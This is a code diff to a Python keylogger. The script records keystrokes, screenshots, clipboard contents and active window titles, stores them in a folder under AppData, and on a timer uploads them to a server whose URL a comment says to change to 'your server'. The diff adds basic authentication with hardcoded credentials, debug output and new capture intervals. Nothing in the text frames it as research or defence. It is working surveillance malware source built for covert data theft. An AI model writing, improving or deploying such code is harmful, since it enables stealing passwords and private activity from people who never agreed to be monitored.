@@ -7,6 +7,7 @@ import os
 import requests
 import pyperclip
 from datetime import datetime, timedelta
+from requests.auth import HTTPBasicAuth
 
 # === CONFIG ===
 BASE_DIR = os.path.expanduser("~\\AppData\\Roaming\\Logs")
@@ -17,7 +18,7 @@ SS_FILE = os.path.join(BASE_DIR, "screenshot.png")
 CLIP_FILE = os.path.join(BASE_DIR, "clipboard.txt")
 START_TIME_FILE = os.path.join(BASE_DIR, "start_time.txt")
 
-SERVER_URL = "http://127.0.0.1:5000/upload"  # your local Flask server
+SERVER_URL = "http://127.0.0.1:5000/upload"  # Change to your server URL
 
 # === INIT START TIME ===
 if not os.path.exists(START_TIME_FILE):
@@ -27,7 +28,8 @@ if not os.path.exists(START_TIME_FILE):
 # === GET ACTIVE WINDOW TITLE ===
 def get_active_window_title():
     try:
-        return os.popen('powershell (Get-Process | Where-Object {$_.MainWindowHandle -ne 0 -and $_.MainWindowTitle -ne ""} | Sort-Object StartTime -Descending | Select-Object -First 1 -ExpandProperty MainWindowTitle)').read().strip()
+        cmd = 'powershell -Command "(Get-Process | Where-Object {$_.MainWindowHandle -ne 0 -and $_.MainWindowTitle -ne \'\'} | Sort-Object StartTime -Descending | Select-Object -First 1 -ExpandProperty MainWindowTitle)"'
+        return os.popen(cmd).read().strip()
     except:
         return "Unknown Window"
 
@@ -82,6 +84,7 @@ def upload_to_server():
     files = {}
 
     try:
+        # Prepare files for upload
         if os.path.exists(LOG_FILE):
             files['keylog'] = open(LOG_FILE, 'rb')
         if os.path.exists(SS_FILE):
@@ -89,14 +92,34 @@ def upload_to_server():
         if os.path.exists(CLIP_FILE):
             files['clipboard'] = open(CLIP_FILE, 'rb')
 
-        response = requests.post(SERVER_URL, files=files, timeout=10)
-        print("Upload result:", response.text)
+        # Debug: print which files will be uploaded
+        print("Preparing to upload files:")
+        for key in files:
+            print(f" - {key}: {files[key].name}")
+
+        # Send POST request
+        response = requests.post(
+            SERVER_URL,
+            files=files,
+            timeout=10,
+            auth=HTTPBasicAuth('admin', 'secure123')  # Make sure this matches server
+        )
+
+        # Debug: print response status
+        print(f"Upload HTTP status code: {response.status_code}")
+        print(f"Server response: {response.text}")
+
+        if response.status_code != 200:
+            print("Upload failed! Check server URL, authentication, and folder permissions.")
+
+    except requests.exceptions.RequestException as e:
+        print(f"Network or request error: {e}")
     except Exception as e:
-        print("Upload failed:", e)
+        print(f"Other error during upload: {e}")
     finally:
+        # Close all opened files
         for f in files.values():
             f.close()
-
 # === DELETE OLD LOGS ===
 def delete_old_logs():
     try:
@@ -112,15 +135,15 @@ def delete_old_logs():
 
 # === SCHEDULER THREAD ===
 def run_scheduler():
-    schedule.every(1).minutes.do(upload_to_server)
-    schedule.every(1).minutes.do(capture_screenshot)
-    schedule.every(5).minutes.do(capture_clipboard)
+    schedule.every(5).minutes.do(upload_to_server)
+    schedule.every(5).minutes.do(capture_screenshot)
+    schedule.every(1).minutes.do(capture_clipboard)
     schedule.every(10).minutes.do(delete_old_logs)
     while True:
         schedule.run_pending()
         time.sleep(1)
 
-# === MAIN ===
+# === MAIN ENTRY POINT ===
 if __name__ == "__main__":
     threading.Thread(target=run_scheduler, daemon=True).start()
     with keyboard.Listener(on_press=on_press) as k_listener, \
